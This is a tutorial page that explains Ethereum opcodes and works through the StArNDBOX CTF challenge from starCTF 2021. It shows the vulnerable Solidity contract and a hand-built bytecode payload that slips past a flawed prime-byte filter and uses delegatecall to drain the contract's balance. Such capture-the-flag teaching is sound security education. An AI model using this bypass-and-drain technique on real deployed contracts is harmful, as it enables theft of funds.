# Ethereum Opcodes
There are 142 opcodes in Ethereum. Some common opcodes are shown below:

| Uint8 | Mnomonic |      Stack Input       | Stack Output |              Expression              |
| :---: | :------: | :--------------------: | :----------: | :----------------------------------: |
|  00   |   STOP   |           -            |      -       |                STOP()                |
|  01   |   ADD    |      \| a \| b \|      | \| a + b \|  |                a + b                 |
|  02   |   MUL    |      \| a \| b \|      | \| a * b \|  |                a * b                 |
|  03   |   SUB    |      \| a \| b \|      | \| a - b \|  |                a - b                 |
|  04   |   DIV    |      \| a \| b \|      | \| a // b \| |                a // b                |
|  51   |  MLOAD   |      \| offset \|      | \| value \|  |   value = memory[offset:offset+32]   |
|  52   |  MSTORE  | \| offset \| value \|  |      -       |   memory[offset:offset+32] = value   |
|  54   |  SLOAD   |       \| key \|        | \| value \|  |         value = storage[key]         |
|  55   |  SSTORE  |   \| key \| value \|   |      -       |         storage[key] = value         |
|  56   |   JUMP   |   \| destination \|    |      -       |          $pc = destination           |
|  5B   | JUMPDEST |           -            |      -       |                  -                   |
|  F3   |  RETURN  | \| offset \| length \| |      -       | return memory[offset:offset+length]  |
|  FD   |  REVERT  | \| offset \| length \| |      -       | revert(memory[offset:offset+length]) |

!!! info 
    JUMPDEST is the destination for jump instructions. Jump instructions cannot jump to locations without a JUMPDEST.

For more detailed opcodes information, see [ethervm.io](https://ethervm.io).

## Example
Using the StArNDBOX challenge from starCTF 2021 as an example to explain opcodes-related challenges.

This challenge deploys the challenge contract with 100 wei sent to it, and our goal is to drain the contract's balance. The source code of the challenge contract is as follows:

```solidity
pragma solidity ^0.5.11;

library Math {
    function invMod(int256 _x, int256 _pp) internal pure returns (int) {
        int u3 = _x;
        int v3 = _pp;
        int u1 = 1;
        int v1 = 0;
        int q = 0;
        while (v3 > 0){
            q = u3/v3;
            u1= v1;
            v1 = u1 - v1*q;
            u3 = v3;
            v3 = u3 - v3*q;
        }
        while (u1<0){
            u1 += _pp;
        }
        return u1;
    }
    
    function expMod(int base, int pow,int mod) internal pure returns (int res){
        res = 1;
        if(mod > 0){
            base = base % mod;
            for (; pow != 0; pow >>= 1) {
                if (pow & 1 == 1) {
                    res = (base * res) % mod;
                }
                base = (base * base) % mod;
            }
        }
        return res;
    }
    function pow_mod(int base, int pow, int mod) internal pure returns (int res) {
        if (pow >= 0) {
            return expMod(base,pow,mod);
        }
        else {
            int inv = invMod(base,mod);
            return expMod(inv,abs(pow),mod);
        }
    }
    
    function isPrime(int n) internal pure returns (bool) {
        if (n == 2 ||n == 3 || n == 5) {
            return true;
        } else if (n % 2 ==0 && n > 1 ){
            return false;
        } else {
            int d = n - 1;
            int s = 0;
            while (d & 1 != 1 && d != 0) {
                d >>= 1;
                ++s;
            }
            int a=2;
            int xPre;
            int j;
            int x = pow_mod(a, d, n);
            if (x == 1 || x == (n - 1)) {
                return true;
            } else {
                for (j = 0; j < s; ++j) {
                    xPre = x;
                    x = pow_mod(x, 2, n);
                    if (x == n-1){
                        return true;
                    }else if(x == 1){
                        return false;
                    }
                }
            }
            return false;
        }
    }
    
    function gcd(int a, int b) internal pure returns (int) {
        int t = 0;
        if (a < b) {
            t = a;
            a = b;
            b = t;
        }
        while (b != 0) {
            t = b;
            b = a % b;
            a = t;
        }
        return a;
    }
    function abs(int num) internal pure returns (int) {
        if (num >= 0) {
            return num;
        } else {
            return (0 - num);
        }
    }
    
}

contract StArNDBOX{
    using Math for int;
    constructor()public payable{
    }
    modifier StAr() {
        require(msg.sender != tx.origin);
        _;
    }
    function StArNDBoX(address _addr) public payable{
        
        uint256 size;
        bytes memory code;
        int res;
        
        assembly{
            size := extcodesize(_addr)
            code := mload(0x40)
            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            mstore(code, size)
            extcodecopy(_addr, add(code, 0x20), 0, size)
        }
        for(uint256 i = 0; i < code.length; i++) {
            res = int(uint8(code[i]));
            require(res.isPrime() == true);
        }
        bool success;
        bytes memory _;
        (success, _) = _addr.delegatecall("");
        require(success);
    }
}
```

As we can see, the `StArNDBoX` function can retrieve the contract at any address and check whether each byte of the contract is a prime number. If it passes the check, it uses `delegatecall` to call the target contract.

However, since the `isPrime` function in this contract is not a complete primality check function, `00` and `01` can also pass the check. Therefore, we can construct the following bytecode:

```
// 0x6100016100016100016100016100016100650361000161fbfbf1
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 01 | PUSH2 0x0001
61 00 65 | PUSH2 0x0065
03       | SUB
61 00 01 | PUSH2 0x0001
61 fb fb | PUSH2 0xfbfb
f1       | CALL
```

This executes the statement `address(0x0001).call.gas(0xfbfb).value(0x0065 - 0x0001)`, which transfers the balance from the challenge contract to address 0x1, thereby draining the balance and satisfying the condition to obtain the flag.


## Challenges

### starCTF 2021
- Challenge Name: StArNDBOX

### RealWorld 2019
- Challenge Name: Montagy

### QWB 2020
- Challenge Name: EasySandbox
- Challenge Name: EGM

### Huawei Kunpeng Computing 2020
- Challenge Name: boxgame

!!! note
    Note: Challenge attachments and related content can be found in the [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) repository.

## References
- [Ethervm](https://ethervm.io)
- [starCTF 2021 - StArNDBOX](https://github.com/sixstars/starctf2021/tree/main/blockchain-StArNDBOX)
